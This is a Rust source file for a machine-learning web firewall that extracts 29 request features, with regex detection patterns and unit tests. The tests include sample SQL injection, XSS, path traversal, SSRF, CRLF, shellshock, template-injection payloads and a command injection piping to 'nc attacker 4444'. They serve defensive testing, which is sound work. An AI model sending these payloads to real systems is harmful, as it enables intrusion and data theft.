//! AI-T2 — 29-feature extractor for the ONNX LightGBM binary classifier.
//!
//! **Parity contract.** This is a verbatim port of the training-time
//! extractor `data/ml_waf/features.py` (and its proven Rust mirror
//! `data/ai_model/src/features.rs`). The shipped model
//! (`data/ai_model/waf_model.onnx`) is a LightGBM tree model trained on
//! the EXACT 29 floats produced here — in the SAME order. LightGBM splits
//! on raw feature thresholds, so there is **no scaler**: the values below
//! are fed to the model as-is. Any drift in count, order, or value
//! corrupts the model's input distribution and its predictions become
//! garbage (this was the root cause of the historical AI false-positive
//! rate — the detector previously emitted 27 mis-computed features).
//!
//! ## Input format
//!
//! Accepts both shapes the training pipeline emits:
//!
//! - **Single-line** (legacy): `"METHOD /url body"`
//! - **Multi-line** (current): `"METHOD /url body\nHeader: value\n…"`
//!   where the kept request headers (see
//!   [`super::AiDetector::build_request_string`]) are appended one per
//!   line. The first `\n` marks where headers begin; the body must not
//!   contain raw newlines (the renderer collapses them to spaces, exactly
//!   as `build_clean_dataset.py` does).
//!
//! ## Feature layout (29)
//!
//! | idx | name                  | source string             |
//! |-----|-----------------------|---------------------------|
//! |  0  | request_len           | whole request (chars)     |
//! |  1  | method_id             | GET=0 POST=1 …            |
//! |  2  | path_len              | URL up to `?` (chars)     |
//! |  3  | query_len             | URL after `?` (chars)     |
//! |  4  | body_len              | body (chars)              |
//! |  5  | num_params            | query + body `&` count    |
//! |  6  | entropy               | url+body (Shannon)        |
//! |  7  | digit_ratio           | url+body                  |
//! |  8  | upper_ratio           | url+body                  |
//! |  9  | special_char_count    | url+body                  |
//! | 10  | single_quote_count    | url+body                  |
//! | 11  | double_quote_count    | url+body                  |
//! | 12  | angle_bracket_count   | url+body                  |
//! | 13  | semicolon_count       | url+body                  |
//! | 14  | pct_encoded_count     | url+body (raw)            |
//! | 15  | sql_keyword_count     | url+body+headers (decoded)|
//! | 16  | xss_pattern_count     | url+body+headers (decoded)|
//! | 17  | path_traversal_count  | url+body+headers (decoded)|
//! | 18  | cmd_injection_count   | url+body+headers (decoded)|
//! | 19  | scanner_count         | url+body+headers (decoded)|
//! | 20  | ssrf_count            | url+body+headers (decoded)|
//! | 21  | php_pattern_count     | url+body+headers (decoded)|
//! | 22  | null_byte_count       | url+body+headers (raw)    |
//! | 23  | hex_encode_count      | url+body (raw)            |
//! | 24  | crlf_inject_count     | url+body (raw)            |
//! | 25  | double_encode_count   | url+body (raw)            |
//! | 26  | ssti_count            | url+body+headers (decoded)|
//! | 27  | header_count          | `\n` count in request     |
//! | 28  | header_entropy        | header text (Shannon)     |
//!
//! Char-statistic features (6–14, 23–25) run on **url+body only** — header
//! text is deliberately excluded so a real browser's header soup doesn't
//! inflate entropy / special-char counts. Attack-pattern features
//! (15–22, 26) run on **url+body+headers** so payloads hidden in
//! User-Agent / Cookie / Authorization still trip. Counts marked `(raw)`
//! run on the un-decoded string; `(decoded)` run on the `%XX`-decoded
//! string.

use std::collections::HashMap;
use std::sync::LazyLock as Lazy;

use regex::Regex;

/// Length of one feature vector. The model's input shape is
/// `[batch, NUM_FEATURES]`.
pub const NUM_FEATURES: usize = 29;

/// Mirror `build_clean_dataset.py` truncation limits so live inference
/// matches training (`_MAX_URL_LEN` / `_MAX_BODY_LEN`).
const MAX_URL_BYTES: usize = 4_096;
const MAX_BODY_BYTES: usize = 8_192;

/// Slice-truncate at most `max_bytes`, snapping to the nearest UTF-8 char
/// boundary so the borrowed string stays valid.
#[inline]
fn truncate_bytes(s: &str, max_bytes: usize) -> &str {
    if s.len() <= max_bytes {
        return s;
    }
    let mut idx = max_bytes;
    while !s.is_char_boundary(idx) {
        idx -= 1;
    }
    &s[..idx]
}

/// Feature names, index-aligned with [`extract_features`]. Matches
/// `FEATURE_NAMES` in `data/ml_waf/features.py`.
#[allow(dead_code)]
pub const FEATURE_NAMES: [&str; NUM_FEATURES] = [
    "request_len",
    "method_id",
    "path_len",
    "query_len",
    "body_len",
    "num_params",
    "entropy",
    "digit_ratio",
    "upper_ratio",
    "special_char_count",
    "single_quote_count",
    "double_quote_count",
    "angle_bracket_count",
    "semicolon_count",
    "pct_encoded_count",
    "sql_keyword_count",
    "xss_pattern_count",
    "path_traversal_count",
    "cmd_injection_count",
    "scanner_count",
    "ssrf_count",
    "php_pattern_count",
    "null_byte_count",
    "hex_encode_count",
    "crlf_inject_count",
    "double_encode_count",
    "ssti_count",
    "header_count",
    "header_entropy",
];

// ─── Regex patterns — verbatim from ml_waf/features.py ────────

static SQL_KEYWORDS: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)\b(select|union|insert|update|delete|drop|create|alter|exec|execute|where|from|having|order|group|join|table|database|schema|char|nchar|varchar|cast|convert|declare|waitfor|xp_|sp_|0x)\b",
    )
    .expect("sql keyword regex compiles")
});

// Context gate for sql_keyword_count (feature 15) — parity with
// ml_waf/features.py `_SQL_CTX`. A lone SQL keyword is natural language
// ("select a table and drop my bet"); we only count keywords when SQL *syntax*
// co-occurs (multi-token clause, comment marker, stacked query, tautology).
// Lookahead-free (the `regex` crate has no look-around) so the boolean match is
// identical to the Python engine. `(?is)` = case-insensitive + dot-matches-\n.
static SQL_CTX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)union\s+(?:all\s+)?select|\bselect\b[^a-zA-Z]*?(?:\*|@@|count\s*\(|distinct\b|top\s+\d|[\w`\[\]]+\s*,)|\bselect\s+(?:version|substring|substr|concat|char|count|current_user|current_database|current_setting|session_user|user|database|group_concat|load_file)\b|@@\w+|\bfrom\s+(?:information_schema|mysql\.|pg_|sys\.|sysobjects)|\binsert\s+into\b|\bdelete\s+from\b|\bupdate\b[^;]{0,80}?\bset\b|\bdrop\s+(?:table|database|schema)\b|\balter\s+table\b|\bcreate\s+(?:table|database)\b|\b(?:order|group)\s+by\s+\d|\bhaving\s+\d|\binto\s+(?:outfile|dumpfile)\b|\bwaitfor\s+delay\b|\b(?:information_schema|load_file|extractvalue|updatexml|benchmark|sleep|pg_sleep)\s*\(|\b(?:xp_|sp_)\w+|(?:--|\#)\s*$|/\*.*?\*/|;\s*(?:select|insert|update|delete|drop|union|create|alter)\b|['"]\s*(?:or|and)\s|\b(?:or|and)\b\s*['"\d][^=<>]{0,12}?[=<>]\s*['"\d\w(]"#,
    )
    .expect("sql context regex compiles")
});

static XSS_MARKERS: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)(<script|javascript:|vbscript:|onload=|onerror=|onclick=|onfocus=|alert\(|confirm\(|prompt\(|document\.cookie|document\.write|eval\(|<iframe|<img\s|<svg|srcdoc=)",
    )
    .expect("xss marker regex compiles")
});

static SCANNER_UA: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)(nikto|sqlmap|nmap|masscan|acunetix|nessus|openvas|dirbuster|gobuster|wfuzz|w3af|commix)",
    )
    .expect("scanner UA regex compiles")
});

static PCT_ENCODED: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"%[0-9a-fA-F]{2}").expect("pct regex"));

// NOTE: matches ml_waf/features.py `_CMD` exactly — `|`, `&&`, `$(`,
// backtick-pairs, and `() {` (shellshock CVE-2014-6271, arrives via headers
// like Accept-Language). Deliberately NOT `;` (a bare semicolon is too common
// in benign cookies / matrix params to be a useful feature for the model).
static CMD_INJECTION: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\||&&|\$\(|`[^`]*`|\(\s*\)\s*\{").expect("cmd regex"));

// Word-boundaries on numeric IPs so `0.0.0.0` no longer matches inside a Chrome
// version string ("Chrome/120.0.0.0" contains "0.0.0.0") — that tripped ssrf_count
// on every modern Chrome UA. Mirrors ml_waf/features.py _SSRF.
static SSRF_TARGETS: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)(?:\b127\.0\.0\.1\b|localhost|\b169\.254\.|\b0\.0\.0\.0\b|::1|file://|dict://|gopher://|ftp://)",
    )
    .expect("ssrf regex compiles")
});

/// True if `s` looks like raw binary (protobuf/gRPC/telemetry beacon) rather than
/// text; its random bytes otherwise trip char/pattern features. Mirrors
/// ml_waf/features.py `_is_binary`: short strings are text; else < 75% printable.
fn is_binary_body(s: &str) -> bool {
    let total = s.chars().count();
    if total < 16 {
        return false;
    }
    let printable = s
        .chars()
        .filter(|&c| (' '..='~').contains(&c) || matches!(c, '\t' | '\n' | '\r'))
        .count();
    (printable as f32) / (total as f32) < 0.75
}

// Bare `.php` removed — a `.php` extension is ordinary in benign legacy/3rd-party
// URLs and was a round-2 AI false-positive driver; the real signals are `php://`,
// `<?php`, or dangerous PHP calls. Mirrors ml_waf/features.py `_PHP`.
static PHP_MARKERS: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)(?:php://|<\?php|eval\(|base64_decode\(|system\(|passthru\(|shell_exec\(|phpinfo\(|\$_(?:GET|POST|REQUEST|FILES)\[)",
    )
    .expect("php marker regex compiles")
});

/// Count only percent-encodings that decode to an injection-relevant byte
/// (control byte <0x20, or one of `<>'"`;|\$`). Benign %20/%2F/%3A/%5B no longer
/// inflate the feature. Mirrors ml_waf/features.py `_dangerous_pct_count`.
fn dangerous_pct_count(s: &str) -> usize {
    PCT_ENCODED
        .find_iter(s)
        .filter(|m| {
            u8::from_str_radix(&m.as_str()[1..], 16)
                .map(|b| b < 0x20
                    || matches!(b, b'<' | b'>' | b'\'' | b'"' | b'`' | b';' | b'|' | b'\\' | b'$'))
                .unwrap_or(false)
        })
        .count()
}

static NULL_BYTE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"%00|\\x00|\\u0000").expect("null byte regex"));

static HEX_LITERAL: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"0x[0-9a-fA-F]{4,}").expect("hex literal regex"));

static CRLF_INJ: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"%0[aAdD]|\\r\\n|\r\n").expect("crlf regex"));

static DOUBLE_PCT: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"%25[0-9a-fA-F]{2}").expect("double-encoded pct regex"));

static SSTI_MARKERS: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?is)(\{\{.*?\}\})|(\$\{[^}]{1,200}\})|(#\{[^}]{1,200}\})|(<%=.*?%>)|(@\([^)]{1,200}\))|(\?\s*new\s*\()|(__(class|mro|subclasses|globals|builtins|import)__)|(freemarker\.template|velocity\.tools)|(\{\s*\d+\s*\*\s*\d+\s*\})",
    )
    .expect("ssti marker regex compiles")
});

// ─── Helpers ─────────────────────────────────────────────────

#[inline]
fn method_id(method: &str) -> f32 {
    match method.trim().to_ascii_uppercase().as_str() {
        "GET" => 0.0,
        "POST" => 1.0,
        "PUT" => 2.0,
        "DELETE" => 3.0,
        "PATCH" => 4.0,
        "HEAD" => 5.0,
        "OPTIONS" => 6.0,
        _ => 7.0,
    }
}

/// Decode `%XX` percent-encoding — mirrors Python's `urllib.parse.unquote`.
///
/// Collects decoded bytes first, then interprets them as UTF-8 (lossy
/// fallback for invalid sequences = Python's `errors='replace'`). A
/// byte-by-byte char-push would produce Latin-1 chars for multi-byte
/// UTF-8 (`%E4%B8%AD` → three Latin-1 chars instead of `中`), drifting
/// the char-count / entropy features from training. Pure ASCII (the
/// common WAF case) is identical either way.
fn url_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut raw: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            let hi = (bytes[i + 1] as char).to_digit(16);
            let lo = (bytes[i + 2] as char).to_digit(16);
            if let (Some(h), Some(l)) = (hi, lo) {
                raw.push((h * 16 + l) as u8);
                i += 3;
                continue;
            }
        }
        raw.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&raw).into_owned()
}

/// Shannon entropy over chars (bits). Empty → 0. Uses a per-char map so
/// every Unicode code point gets its own bucket (matches Python's
/// `Counter`); a fixed 256-slot array would merge all code points > 255
/// and underestimate entropy for non-ASCII payloads.
fn shannon_entropy(s: &str) -> f32 {
    if s.is_empty() {
        return 0.0;
    }
    let mut counts: HashMap<char, u32> = HashMap::new();
    let mut n = 0u32;
    for c in s.chars() {
        *counts.entry(c).or_insert(0) += 1;
        n += 1;
    }
    let total = n as f32;
    counts
        .values()
        .map(|&c| {
            let p = (c as f32) / total;
            -p * p.log2()
        })
        .sum()
}

// ─── Public extractor ────────────────────────────────────────

/// Extract the 29-feature vector. See the module docs for the exact
/// layout and the parity contract with `data/ml_waf/features.py`.
pub fn extract_features(request: &str) -> [f32; NUM_FEATURES] {
    // Split first line (request line) from header lines (if any).
    let (first_line, headers_text): (&str, String) = match request.find('\n') {
        Some(nl) => (&request[..nl], request[nl + 1..].replace('\n', " ")),
        None => (request, String::new()),
    };

    // Three-piece split: METHOD / URL / BODY (body = everything after the
    // second space). Truncate URL + body to the training limits.
    let mut parts = first_line.splitn(3, ' ');
    let method = parts.next().unwrap_or("GET");
    let url = truncate_bytes(parts.next().unwrap_or("/"), MAX_URL_BYTES);
    let body = truncate_bytes(parts.next().unwrap_or(""), MAX_BODY_BYTES);

    // URL → (path, query).
    let (path, query) = match url.find('?') {
        Some(pos) => (&url[..pos], &url[pos + 1..]),
        None => (url, ""),
    };

    // Binary body (protobuf/gRPC/beacon) → excluded from text feature scans (its
    // random bytes otherwise trip char/pattern features); length features
    // (body_len #4, request_len #0) still use the real body. Mirrors features.py.
    let body_feat: &str = if is_binary_body(body) { "" } else { body };

    // Char-statistic surface: URL + body only (no header noise).
    let full_for_chars = {
        let mut s = url.to_string();
        if !body_feat.is_empty() {
            s.push(' ');
            s.push_str(body_feat);
        }
        s
    };
    // Attack-pattern surface: URL + body + header values.
    let full_for_patterns = {
        let mut s = full_for_chars.clone();
        if !headers_text.is_empty() {
            s.push(' ');
            s.push_str(&headers_text);
        }
        s
    };
    let full_dec_for_patterns = url_decode(&full_for_patterns);

    // Ratio denominator — char count of the char surface, clamped to 1.
    let n = full_for_chars.chars().count().max(1) as f32;

    // num_params — query + body `&`-separated params; header values excluded.
    let num_params = {
        let q = if query.is_empty() {
            0
        } else {
            query.matches('&').count() + 1
        };
        let b = if body_feat.is_empty() {
            0
        } else {
            body_feat.matches('&').count() + 1
        };
        (q + b) as f32
    };

    let digit_count = full_for_chars.chars().filter(|c| c.is_ascii_digit()).count() as f32;
    let upper_count = full_for_chars.chars().filter(|c| c.is_ascii_uppercase()).count() as f32;
    let special_count = full_for_chars
        .chars()
        .filter(|c| matches!(c, '\'' | '"' | '<' | '>' | ';'))  // injection chars only (= % & + are benign URL syntax)
        .count() as f32;

    // "../" has no alphabetic chars, so the count is case-invariant —
    // scan the decoded string directly (matches the training extractor).
    let path_traversal_count = full_dec_for_patterns.matches("../").count() as f32;

    [
        request.chars().count() as f32,                          // 0  request_len (chars, incl. headers)
        method_id(method),                                       // 1  method_id
        path.chars().count() as f32,                             // 2  path_len (chars)
        query.chars().count() as f32,                            // 3  query_len (chars)
        body.chars().count() as f32,                             // 4  body_len (chars)
        num_params,                                              // 5  num_params (query + body)
        shannon_entropy(&full_for_chars),                        // 6  entropy (url+body)
        digit_count / n,                                         // 7  digit_ratio
        upper_count / n,                                         // 8  upper_ratio
        special_count,                                           // 9  special_char_count
        full_for_chars.matches('\'').count() as f32,             // 10 single_quote_count
        full_for_chars.matches('"').count() as f32,              // 11 double_quote_count
        (full_for_chars.matches('<').count() + full_for_chars.matches('>').count()) as f32, // 12 angle_bracket_count
        full_for_chars.matches(';').count() as f32,              // 13 semicolon_count
        dangerous_pct_count(&full_for_chars) as f32,             // 14 pct_encoded_count  (injection-relevant only, url+body)
        if SQL_CTX.is_match(&full_dec_for_patterns) {            // 15 sql_keyword_count (decoded, context-gated)
            SQL_KEYWORDS.find_iter(&full_dec_for_patterns).count() as f32
        } else {
            0.0
        },
        XSS_MARKERS.find_iter(&full_dec_for_patterns).count() as f32,  // 16 xss_pattern_count (decoded)
        path_traversal_count,                                    // 17 path_traversal_count (decoded)
        CMD_INJECTION.find_iter(&full_dec_for_patterns).count() as f32, // 18 cmd_injection_count (decoded)
        SCANNER_UA.find_iter(&full_dec_for_patterns).count() as f32,    // 19 scanner_count (decoded)
        SSRF_TARGETS.find_iter(&full_dec_for_patterns).count() as f32,  // 20 ssrf_count (decoded)
        PHP_MARKERS.find_iter(&full_dec_for_patterns).count() as f32,   // 21 php_pattern_count (decoded)
        NULL_BYTE.find_iter(&full_for_patterns).count() as f32,  // 22 null_byte_count (raw, url+body+hdrs)
        HEX_LITERAL.find_iter(&full_for_chars).count() as f32,   // 23 hex_encode_count (raw, url+body)
        CRLF_INJ.find_iter(&full_for_chars).count() as f32,      // 24 crlf_inject_count (raw, url+body)
        DOUBLE_PCT.find_iter(&full_for_chars).count() as f32,    // 25 double_encode_count (raw, url+body)
        SSTI_MARKERS.find_iter(&full_dec_for_patterns).count() as f32, // 26 ssti_count (decoded)
        request.matches('\n').count() as f32,                    // 27 header_count
        shannon_entropy(&headers_text),                          // 28 header_entropy
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    fn approx_eq(a: f32, b: f32) -> bool {
        (a - b).abs() < 1e-3
    }

    #[test]
    fn vector_is_exactly_29_features() {
        let v = extract_features("GET / HTTP/1.1");
        assert_eq!(v.len(), NUM_FEATURES);
        assert_eq!(NUM_FEATURES, 29);
        assert_eq!(FEATURE_NAMES.len(), NUM_FEATURES);
    }

    #[test]
    fn method_id_matches_training_map() {
        assert_eq!(method_id("GET"), 0.0);
        assert_eq!(method_id("POST"), 1.0);
        assert_eq!(method_id("PUT"), 2.0);
        assert_eq!(method_id("DELETE"), 3.0);
        assert_eq!(method_id("PATCH"), 4.0);
        assert_eq!(method_id("HEAD"), 5.0);
        assert_eq!(method_id("OPTIONS"), 6.0);
        assert_eq!(method_id("OBSCURE"), 7.0);
        assert_eq!(method_id("get"), 0.0, "case-insensitive");
    }

    #[test]
    fn url_decode_handles_pct() {
        assert_eq!(url_decode("a%20b"), "a b");
        assert_eq!(url_decode("a%2fb"), "a/b");
        assert_eq!(url_decode("%2E%2E"), "..");
        // Non-hex passthrough.
        assert_eq!(url_decode("100%"), "100%");
        assert_eq!(url_decode("%zz"), "%zz");
        // Multi-byte UTF-8 reassembles correctly (not Latin-1).
        assert_eq!(url_decode("%E4%B8%AD"), "中");
    }

    #[test]
    fn entropy_matches_intuition() {
        assert_eq!(shannon_entropy(""), 0.0);
        assert!(approx_eq(shannon_entropy("aaaa"), 0.0));
        assert!(approx_eq(shannon_entropy("ab"), 1.0));
    }

    #[test]
    fn clean_get_root_has_low_attack_signals() {
        let v = extract_features("GET / HTTP/1.1");
        assert_eq!(v[15], 0.0, "sql_keyword_count");
        assert_eq!(v[16], 0.0, "xss_pattern_count");
        assert_eq!(v[17], 0.0, "path_traversal_count");
        assert_eq!(v[18], 0.0, "cmd_injection_count");
        assert_eq!(v[19], 0.0, "scanner_count");
        assert_eq!(v[20], 0.0, "ssrf_count");
        assert_eq!(v[26], 0.0, "ssti_count");
    }

    #[test]
    fn sqli_payload_lights_up_sql_count() {
        let v = extract_features("GET /search?q=' UNION SELECT password FROM users--");
        assert!(v[15] >= 3.0, "sql_keyword_count should hit union+select+from, got {}", v[15]);
        assert!(v[10] >= 1.0, "single_quote_count");
    }

    #[test]
    fn xss_payload_lights_up_xss_count() {
        let v = extract_features("GET /?q=<script>alert(1)</script>");
        assert!(v[16] >= 2.0, "xss markers (<script + alert), got {}", v[16]);
        assert!(v[12] >= 2.0, "angle_bracket_count");
    }

    #[test]
    fn path_traversal_lights_up_after_decoding() {
        let v = extract_features("GET /files?p=..%2F..%2Fetc%2Fpasswd");
        assert!(v[17] >= 1.0, "path_traversal_count after decode, got {}", v[17]);
        assert!(v[14] >= 3.0, "pct_encoded_count, got {}", v[14]);
    }

    #[test]
    fn ssrf_payload_lights_up_ssrf_count() {
        let v = extract_features("GET /fetch?url=http://169.254.169.254/latest/meta-data/");
        assert!(v[20] >= 1.0, "ssrf_count, got {}", v[20]);
    }

    #[test]
    fn scanner_ua_in_body_lights_scanner_count() {
        let v = extract_features("GET / sqlmap/1.5.7");
        assert!(v[19] >= 1.0, "scanner_count, got {}", v[19]);
    }

    #[test]
    fn scanner_ua_in_header_lights_scanner_count() {
        // Header on the second line still trips the scanner regex because
        // the pattern surface folds header text in.
        let v = extract_features("GET /admin\nUser-Agent: sqlmap/1.7");
        assert!(v[19] >= 1.0, "scanner_count via header, got {}", v[19]);
    }

    #[test]
    fn double_encode_lights_up() {
        let v = extract_features("GET /?q=%2527OR%25201%253D1");
        assert!(v[25] >= 3.0, "double_encode_count, got {}", v[25]);
    }

    #[test]
    fn crlf_injection_lights_up() {
        let v = extract_features("GET /?h=%0d%0aSet-Cookie:%20evil=1");
        assert!(v[24] >= 1.0, "crlf_inject_count via %0a, got {}", v[24]);
    }

    #[test]
    fn null_byte_lights_up() {
        let v = extract_features("GET /file.txt%00.png");
        assert!(v[22] >= 1.0, "null_byte_count, got {}", v[22]);
    }

    #[test]
    fn cmd_injection_lights_up() {
        // Pipe-to-command — matches `_CMD` (`\|`). NOTE: a bare `;`
        // does NOT count (the training regex excludes it).
        let v = extract_features("GET /ping?host=8.8.8.8|nc%20attacker%204444");
        assert!(v[18] >= 1.0, "cmd_injection_count via pipe, got {}", v[18]);
    }

    #[test]
    fn bare_semicolon_does_not_trip_cmd() {
        // Matrix/cookie-style ';' must NOT count as cmd injection — the
        // training `_CMD` regex deliberately omits ';'.
        let v = extract_features("GET /td/activity;cat=prddtl;ord=1;src=42");
        assert_eq!(v[18], 0.0, "bare ';' must not count, got {}", v[18]);
    }

    #[test]
    fn shellshock_in_header_lights_cmd_count() {
        // CVE-2014-6271: "() {" signature delivered via Accept-Language. With
        // the header folded in, cmd_injection_count must fire — matches the
        // shellshock alternation added to the training `_CMD` regex.
        let v = extract_features("GET /\nAccept-Language: () { :; }; echo vuln");
        assert!(v[18] >= 1.0, "cmd_injection_count via shellshock header, got {}", v[18]);
    }

    #[test]
    fn ssti_lights_up_on_jinja_arithmetic() {
        let v = extract_features("GET /search?q={{7*7}}");
        assert!(v[26] >= 1.0, "ssti_count for {{...}}, got {}", v[26]);
    }

    #[test]
    fn ssti_lights_up_on_spel() {
        let v = extract_features("GET /?q=${T(java.lang.Runtime).getRuntime().exec('id')}");
        assert!(v[26] >= 1.0, "ssti_count for ${{...}}, got {}", v[26]);
    }

    #[test]
    fn header_count_and_entropy() {
        // 0 headers → header_count 0, header_entropy 0.
        let v0 = extract_features("GET /api/users?id=1");
        assert_eq!(v0[27], 0.0, "header_count");
        assert_eq!(v0[28], 0.0, "header_entropy");
        // 2 header lines → header_count 2, header_entropy > 0.
        let v2 = extract_features("GET /\nUser-Agent: Mozilla/5.0\nCookie: sid=abc");
        assert_eq!(v2[27], 2.0, "header_count, got {}", v2[27]);
        assert!(v2[28] > 0.0, "header_entropy, got {}", v2[28]);
    }

    #[test]
    fn char_counts_exclude_headers() {
        // Quotes/angle-brackets in HEADER text must NOT inflate the
        // char-stat features (those run on url+body only).
        let v = extract_features("GET /\nReferer: https://x/\"<>'");
        assert_eq!(v[10], 0.0, "single_quote_count ignores headers");
        assert_eq!(v[11], 0.0, "double_quote_count ignores headers");
        assert_eq!(v[12], 0.0, "angle_bracket_count ignores headers");
    }

    #[test]
    fn ratios_are_bounded_zero_to_one() {
        let v = extract_features("GET /AAAAAAAA HTTP/1.1");
        assert!(v[7] >= 0.0 && v[7] <= 1.0, "digit_ratio bounds: {}", v[7]);
        assert!(v[8] >= 0.0 && v[8] <= 1.0, "upper_ratio bounds: {}", v[8]);
    }

    #[test]
    fn empty_request_does_not_panic() {
        let _ = extract_features("");
        let _ = extract_features("GET");
        let _ = extract_features("GET ");
        let _ = extract_features("GET / ");
        let _ = extract_features("? ");
    }

    /// Cross-language parity guard. Golden vectors generated by running
    /// the AUTHORITATIVE training extractor `data/ml_waf/features.py` on
    /// each request string (`python3 -c "import features; ..."`). If this
    /// fails, the detector has drifted from what `waf_model.onnx` was
    /// trained on — the model's input distribution is corrupted and its
    /// predictions are no longer trustworthy. Regenerate only after a
    /// deliberate retrain with a matching features.py.
    #[test]
    fn parity_with_training_python() {
        let cases: &[(&str, [f32; NUM_FEATURES])] = &[
            (
                "GET /search?q=' UNION SELECT * FROM users--\nUser-Agent: sqlmap/1.7",
                [66.0, 0.0, 7.0, 3.0, 27.0, 2.0, 4.558107, 0.0, 0.384615, 2.0, 1.0, 0.0, 0.0, 0.0, 0.0, 3.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 4.277613],
            ),
            (
                "POST /api/feedback {\"c\":\"<script>alert(1)</script>\"}\nContent-Type: application/json",
                [83.0, 1.0, 13.0, 0.0, 33.0, 1.0, 4.378329, 0.021277, 0.0, 8.0, 0.0, 4.0, 4.0, 0.0, 0.0, 0.0, 2.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 3.964735],
            ),
            (
                "GET /static/..%2f..%2fetc%2fpasswd\nReferer: http://169.254.169.254/",
                [67.0, 0.0, 30.0, 0.0, 0.0, 0.0, 3.647743, 0.1, 0.0, 3.0, 0.0, 0.0, 0.0, 0.0, 3.0, 0.0, 0.0, 2.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 3.991729],
            ),
            (
                "GET /\nUser-Agent: Mozilla/5.0\nCookie: sid=abc",
                [45.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 4.592593],
            ),
        ];
        for (req, want) in cases {
            let got = extract_features(req);
            for i in 0..NUM_FEATURES {
                assert!(
                    approx_eq(got[i], want[i]),
                    "feature[{i}] ({}) = {} but training python = {} for {req:?}",
                    FEATURE_NAMES[i], got[i], want[i],
                );
            }
        }
    }

    #[test]
    fn no_nan_or_inf_in_output() {
        let inputs = [
            "GET / HTTP/1.1",
            "POST /login user=admin&pass=test",
            "GET /?q=' UNION SELECT *",
            "GET /<script>alert(1)</script>",
            "GET /%00",
            "GET /a/b/c",
            "GET /\nUser-Agent: sqlmap/1.7",
            "",
        ];
        for s in inputs {
            let v = extract_features(s);
            for (i, x) in v.iter().enumerate() {
                assert!(x.is_finite(), "feature {} is non-finite for {:?}", i, s);
            }
        }
    }

    // ─── Context-gated sql_keyword_count (parity with features.py) ───────────

    #[test]
    fn sql_keywords_in_prose_score_zero() {
        // Natural-language /api/feedback comments with SQL homographs — these
        // were the #1 false positive. Feature 15 must be 0.
        let prose = [
            "POST /api/feedback {\"comment\": \"select a different table and drop my old bet\"}",
            "POST /api/feedback {\"comment\": \"add a UNION of poker and blackjack rooms\"}",
            "POST /api/feedback {\"comment\": \"please select from the menu and update my order\"}",
            "POST /api/feedback {\"comment\": \"order by phone or join us at the table\"}",
        ];
        for s in prose {
            assert_eq!(extract_features(s)[15], 0.0, "prose flagged as SQL: {s:?}");
        }
    }

    #[test]
    fn real_sqli_with_keywords_still_counts() {
        let attacks = [
            "GET /p?id=1 UNION SELECT username,password FROM users",
            "GET /p?q=1; DROP TABLE users; --",
            "GET /p?q=1) ORDER BY 3-- -",
            "GET /p?id=1 UNION ALL SELECT NULL,@@version,NULL",
        ];
        for s in attacks {
            assert!(extract_features(s)[15] > 0.0, "keyword SQLi not flagged: {s:?}");
        }
    }
}
